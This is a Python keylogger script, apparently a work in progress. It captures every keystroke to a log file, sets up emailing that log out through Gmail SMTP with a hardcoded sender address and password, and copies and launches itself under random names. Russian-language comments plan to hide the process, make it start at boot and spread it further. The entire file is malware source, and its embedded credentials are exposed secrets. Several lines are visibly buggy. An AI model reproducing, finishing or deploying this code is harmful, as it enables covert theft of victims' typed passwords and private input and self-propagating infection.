#!/usr/bin/python3

try:
    import schedule
    from pynput import keyboard
    import smtplib
    import email
    import email.mime.application
    from email.mime.multipart import MIMEMultipart
    from pynput.keyboard import Key, Listener
    import os, sys, time, uuid
except ModuleNotFoundError:
    from subprocess import call
    packets = ["pynput", "smtplib", "email", "schedule"]
    call("pip install" + ' '.join(packets), shell=True)
finally:

    EMAIL_ADDR = "cnxnd11@gmail.com"
    PASSWD = "moejmdsbakpxsmmt"

    pressedkeys = []

    msg = MIMEMultipart()

    msg['Subject'] = 'Keylog Data'
    msg['From'] = 'cnxnd11@gmail.com'
    msg['To'] = 'snesrienko@gmail.com'

    filename = 'log.log'
    fp = open(filename, 'rb')
    att = email.mime.application.MIMEApplication(fp.read(), _subtype="log")
    fp.close()
    att.add_header('Content-Disposition', 'attachment', filename=filename)

    msg.attach(att)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EMAIL_ADDR, PASSWD)

    def on_press(key):
        try:
            pressedkeys.append(key.char)
        except AttributeError:
            pressedkeys.append(f" {key} ")

        writeToFile(pressedkeys)

    def writeToFile(pressedkeys):
        with open("log.log", "w") as file:
            for keybKey in pressedkeys:
                cleankey = str(keybKey).replace("'" and "Key", "")
                file.write(cleankey)

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    # скрытая работа, запуск  ok поебись с батниками и тп
    # автозапуск при загрузке пк(прятать из загрузки) сделать файл скрытым
    # подумай над shedule каждый час отправлять данные
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()
        # DELETE THIS!!!!
    for i in range(len(pressedkeys)):
        print(pressedkeys[i])
        # DELETE THIS!!!!

    with open(sys.argv[0]) as file:
        self_content = file.read()
        # while True:
        for i in range(1):
            # wait 3 seconds
            time.sleep(3)

            # create unique filename
            dupe = "%s.py" % uuid.uuid4()

            # open and write to the copy
            copy = open(dupe, "w")
            copy.write(self_content)
            copy.close()

            # make the copy executable and execute
            # os.chmod(dupe, "0777"))
            os.system("./%s &" % dupe) #доделать расспространение

    if __name__ == '__main__':
        # server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
        # server.quit()
        pass